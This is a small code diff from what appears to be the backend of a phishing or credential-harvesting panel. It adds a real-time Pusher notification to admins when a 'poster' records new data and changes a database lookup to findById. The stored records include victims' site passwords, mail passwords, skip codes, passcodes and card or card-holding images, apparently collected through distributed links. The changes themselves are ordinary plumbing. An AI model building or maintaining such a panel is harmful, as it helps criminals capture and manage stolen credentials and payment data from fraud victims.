@@ -363,6 +363,9 @@ export const add_data = async (req, res) => {
             })
             posterFound.details.push(info._id)
             await posterFound.save();
+            pusher.trigger('notifications', 'new-notification', {
+                adminId,posterId
+              });
             
             return   res.status(200).json({ info: info })
 
@@ -512,7 +515,7 @@ export const poster_details =  (req, res) => {
 
 
 
-    Poster.findOne({ _id: id })
+    Poster.findById(id)
     .select('username password posterId links createdAt details')
     .populate('details', 'site email password skipcode username passcode mail mailPass onlyCard holdingCard createdAt').sort({ createdAt: -1 })
 
